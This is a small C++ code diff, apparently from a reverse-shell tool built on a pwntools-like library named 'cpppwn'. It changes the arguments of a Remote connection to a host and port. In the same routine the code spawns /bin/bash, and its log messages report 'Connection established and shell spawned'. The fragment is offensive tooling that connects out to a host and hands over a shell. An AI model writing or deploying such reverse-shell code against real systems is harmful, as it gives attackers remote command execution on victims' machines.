@@ -32,7 +32,7 @@ public:
     void run() {
         try {
             logger::debug("Session {}: Attempting connection to {}:{}", session_id, host, port);
-            cpppwn::Remote conn(host, port);
+            cpppwn::Remote conn(host, port, true, false);
             cpppwn::Process shell("/bin/bash", {"/bin/bash"});
             logger::debug("Session {}: Connection established and shell spawned.", session_id);
 
